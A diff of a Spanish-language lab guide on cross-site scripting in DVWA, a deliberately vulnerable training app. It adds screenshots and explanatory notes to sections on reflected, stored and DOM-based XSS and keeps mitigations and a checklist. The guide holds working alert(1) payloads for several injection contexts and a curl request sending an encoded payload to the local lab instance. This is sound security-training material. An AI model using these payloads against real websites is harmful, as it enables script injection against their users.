@@ -58,11 +58,13 @@ export COOKIE="PHPSESSID=<TU_SESION>; security=low"
   ```html
   <script>alert(1)</script>
   ```
+  
 * **HTML/atributo** (romper atributo y abrir handler):
 
   ```html
   " autofocus onfocus=alert(1) x="
   ```
+  
 * **HTML/etiqueta SVG** (a menudo menos filtrada):
 
   ```html
@@ -73,6 +75,7 @@ export COOKIE="PHPSESSID=<TU_SESION>; security=low"
   ```js
   ');alert(1);//
   ```
+  
 * **URL javascript:** (si el enlace imprime sin validar):
 
   ```
@@ -103,15 +106,28 @@ PY
 
    Si aparece un popup, anota **URL**, **parámetro** y **contexto**.
 
-2. **Evidencia**: captura de pantalla del popup y del HTML (vista código o DevTools).
+   a) **Popup:**
+  
+  <img width="471" height="168" alt="imagen" src="https://github.com/user-attachments/assets/678f4072-9ef1-455d-8985-1753f005f4bf" />
 
-3. **cURL (opcional)**: descubre el **nombre del parámetro** (DevTools → pestaña Network) y repite con el payload URL‑encodeado. Ejemplo genérico (ajusta `PARAM`):
+
+   b) **URL:** http://127.0.0.1:8080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27xss-reflected%27%29%3C%2Fscript%3E#
+
+   c) **Context:**
+
+  <img width="671" height="163" alt="imagen" src="https://github.com/user-attachments/assets/66e546f8-ab5e-4075-a729-05c5276f2a77" />
+
+
+2. **cURL (opcional)**: descubre el **nombre del parámetro** (DevTools → pestaña Network) y repite con el payload URL‑encodeado. Ejemplo genérico (ajusta `PARAM`):
 
 ```bash
 curl -s \
   "$DVWA/vulnerabilities/xss_r/?PARAM=%3Cscript%3Ealert(1)%3C%2Fscript%3E" \
   --cookie "$COOKIE" | tee ~/Pentesting/DVWA/xss/reflected/evidence/reflected_response.html
 ```
+
+<img width="686" height="149" alt="imagen" src="https://github.com/user-attachments/assets/7749c358-648f-4a6d-b18c-328645292f03" />
+
 
 > Nota: con `curl` **no verás** el popup, pero puedes confirmar que tu payload vuelve sin escapar en la respuesta.
 
@@ -120,12 +136,6 @@ curl -s \
 * `"><svg/onload=alert(1)>`
 * `</script><script>alert(1)</script>` (si estás dentro de `<script>`)
 * `';alert(1);//` (si la entrada cae dentro de una cadena JS)
-
-### Qué documentar
-
-* Parámetro vulnerable, contexto, payload efectivo, captura de HTML donde se inserta.
-
----
 
 ## 5) Stored XSS (Low)
 
@@ -139,9 +149,11 @@ curl -s \
    <script>alert('xss-stored')</script>
    ```
 
+<img width="678" height="377" alt="imagen" src="https://github.com/user-attachments/assets/b9f3ce51-6781-47d4-8784-6c82fbc12dbe" />
+
 2. Envía y recarga la página (o entra con otro usuario) → el payload se ejecutará **cada vez** que se renderice el comentario almacenado.
 
-3. **Evidencia**: captura del popup y del comentario guardado con el código inyectado.
+<img width="675" height="370" alt="imagen" src="https://github.com/user-attachments/assets/486bcd5b-9266-4b4a-b42d-5dee22b88722" />
 
 ### Variaciones
 
@@ -152,9 +164,11 @@ curl -s \
   <svg onload=alert(1)></svg>
   ```
 
-### Qué documentar
+<img width="426" height="727" alt="imagen" src="https://github.com/user-attachments/assets/48d12576-a4d7-479b-a69a-12050c901566" />
 
-* Campo vulnerable (Name/Message), evidencia de persistencia (sigue ejecutando tras recarga), payload.
+### Captado
+
+* Campo vulnerable (Name/Message), evidencia de persistencia (sigue ejecutando tras recarga de página o cambio de usuario), payload.
 
 ---
 
@@ -173,15 +187,21 @@ Aquí la vulnerabilidad está en **JavaScript del cliente** (p. ej., usa `locati
      ```
      $DVWA/vulnerabilities/xss_d/#<script>alert('xss-dom')</script>
      ```
+     
+<img width="849" height="744" alt="imagen" src="https://github.com/user-attachments/assets/496eb2ec-1601-4948-b0e8-62beaf8f690c" />
+
+    
    * Variante con **query** (si la página usa `?default=` u otro parámetro):
 
      ```
      $DVWA/vulnerabilities/xss_d/?default=<script>alert('xss-dom')</script>
      ```
 
-2. Si aparece el popup, confirma en DevTools → **Sources** / **Elements** qué **sink** se usa (`innerHTML`, `document.write`, etc.).
 
-3. **Evidencia**: captura del popup + fragmento/URL utilizada + trozo de JS vulnerable (ver **View Source** de DVWA para este módulo).
+<img width="505" height="223" alt="imagen" src="https://github.com/user-attachments/assets/56be31f2-c18d-49e1-b654-56dd78ceb9e7" />
+
+
+1. Si aparece el popup, confirma en DevTools → **Sources** / **Elements** qué **sink** se usa (`innerHTML`, `document.write`, etc.).
 
 ### Variaciones
 
@@ -248,11 +268,39 @@ Uso:
   "$COOKIE"
 ```
 
+<img width="925" height="396" alt="imagen" src="https://github.com/user-attachments/assets/6293d998-570b-4371-97d7-f7ec8d0c2c21" />
+
+#### 🧪 ¿Qué significa “No reflejado literal”?
+
+El script está buscando si el payload aparece tal cual en la respuesta HTML. Si no lo encuentra, nos dice:
+
+```codigo
+[ ] No reflejado literal (revisar contexto/encoding)
+```
+
+Esto ***no significa que no sea vulnerable***, solo que el payload no se refleja exactamente como lo enviaste. Puede estar:
+
+- Codificado (ejemplo: < convertido en &lt;)
+- Filtrado o escapado.
+- Insertado en un contexto diferente (dentro de un atributo, comentario...)
+
+#### 🔍 ¿Qué hacer ahora?
+
+1. Abrir los archivos HTML
+
+Abrimos los archivos generados para inspeccionar cómo se refleja el payload:
+
+```bash
+firefox ~/Pentesting/DVWA/xss/reflected/evidence/resp_1.html
+```
+
+Hacemos esto para cada archivo (resp_2.html, resp_3.html...).
+
 > ⚠️ La detección es heurística: que aparezca el literal no **garantiza** ejecución (depende del contexto). Verifica en el navegador.
 
 ---
 
-## 8) Mitigaciones (para escribir en conclusiones)
+## 8) Mitigaciones 
 
 **Escapado según contexto (server‑side):**
 
@@ -294,7 +342,7 @@ Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none
 
 ---
 
-## 10) Lista de verificación (lo mínimo que debes entregar)
+## 10) Lista de verificación 
 
 * [ ] POC funcional de **Reflected XSS** con evidencia y notas de contexto.
 * [ ] POC funcional de **Stored XSS** persistente con evidencia.
